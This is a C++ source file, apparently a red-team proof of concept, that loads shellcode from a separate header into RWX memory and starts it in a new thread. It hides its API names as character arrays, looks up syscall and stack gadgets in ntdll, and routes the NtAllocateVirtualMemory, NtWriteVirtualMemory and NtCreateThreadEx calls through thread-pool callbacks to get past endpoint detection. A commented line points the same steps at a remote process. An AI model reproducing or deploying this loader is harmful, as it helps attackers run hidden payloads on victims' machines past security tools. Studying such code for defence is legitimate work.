#include "Callbacks.h"
#include "Shellcode.h"

#include <iostream>

//Definition of the Windows Thread Pooling functions
typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

FARPROC pTpAllocWork;
FARPROC pTpPostWork;
FARPROC pTpReleaseWork;

/////////////////////////
//  GENERAL FUNCTIONS  //
/////////////////////////

HMODULE hNtdll;

VOID initVariables() {
    unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
    hNtdll = GetModuleHandleA((LPCSTR)sNtdll);

    Search_For_Syscall_Ret(hNtdll);
    Search_For_Add_Rsp_Ret(hNtdll);

    unsigned char sTpAllocWork[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k' , 0x0 };
    pTpAllocWork = GetProcAddress(hNtdll, (LPCSTR)sTpAllocWork);

    unsigned char sTpPostWork[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k' , 0x0 };
    pTpPostWork = GetProcAddress(hNtdll, (LPCSTR)sTpPostWork);

    unsigned char sTpReleaseWork[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0x0 };
    pTpReleaseWork = GetProcAddress(hNtdll, (LPCSTR)sTpReleaseWork);
}

VOID setCallback(PTP_WORK_CALLBACK callback, PVOID args) {
    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)callback, args, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
}

/////////////////////////
//  NTDLL'S FUNCTIONS  //
/////////////////////////

PVOID NtAllocateVirtualMemory(HANDLE hProcess) {
    PVOID allocatedAddress = NULL;
    SIZE_T allocatedsize = 0x1000;

    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.zeroBits = 0;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.allocationType = (MEM_RESERVE | MEM_COMMIT);
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;

    setCallback((PTP_WORK_CALLBACK)NtAllocateVirtualMemory_Callback, &ntAllocateVirtualMemoryArgs);

    return allocatedAddress;
}

VOID NtWriteVirtualMemory(HANDLE hProcess, PVOID allocatedAddress, PULONG bytesWritten) {
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.hProcess = hProcess;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = code;
    ntWriteVirtualMemoryArgs.numberOfBytesToWrite = sizeof(code);
    ntWriteVirtualMemoryArgs.numberOfBytesWritten = bytesWritten;

    setCallback((PTP_WORK_CALLBACK)NtWriteVirtualMemory_Callback, &ntWriteVirtualMemoryArgs);
}

VOID NtCreateThreadEx(HANDLE hProcess, HANDLE hThread, PVOID allocatedAddress) {
    NTCREATETHREADEX_ARGS ntCreateThreadExArgs = { 0 };
    ntCreateThreadExArgs.threadHandle = &hThread;
    ntCreateThreadExArgs.desiredAccess = GENERIC_EXECUTE;
    ntCreateThreadExArgs.objectAttributes = NULL;
    ntCreateThreadExArgs.processHandle = hProcess;
    ntCreateThreadExArgs.lpStartAddress = allocatedAddress;
    ntCreateThreadExArgs.lpParameter = NULL;
    ntCreateThreadExArgs.flags = FALSE;
    ntCreateThreadExArgs.stackZeroBits = 0;
    ntCreateThreadExArgs.sizeOfStackCommit = 0;
    ntCreateThreadExArgs.sizeOfStackReserve = 0;
    ntCreateThreadExArgs.lpBytesBuffer = NULL;

    setCallback((PTP_WORK_CALLBACK)NtCreateThreadEx_Callback, &ntCreateThreadExArgs);
}

////////////
//  MAIN  //
////////////

int main() {
    initVariables();

    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <PID>);
    HANDLE hProcess = (HANDLE)-1;

    std::cout << "[*] Executing NtAllocateVirtualMemory..." << std::endl;
    PVOID allocatedAddress = NtAllocateVirtualMemory(hProcess);
    std::cout << "\t[+] Allocated at: 0x" << allocatedAddress << std::endl;

    ULONG writenSize = 0;
    std::cout << "[*] Executing NtWriteVirtualMemory..." << std::endl;
    NtWriteVirtualMemory(hProcess, allocatedAddress, &writenSize);

    HANDLE hThread = NULL;
    std::cout << "[*] Executing NtCreateThreadEx..." << std::endl;
    NtCreateThreadEx(hProcess, hThread, allocatedAddress);

    //WaitForSingleObject(hThread, 0x1000);

    return 0;
}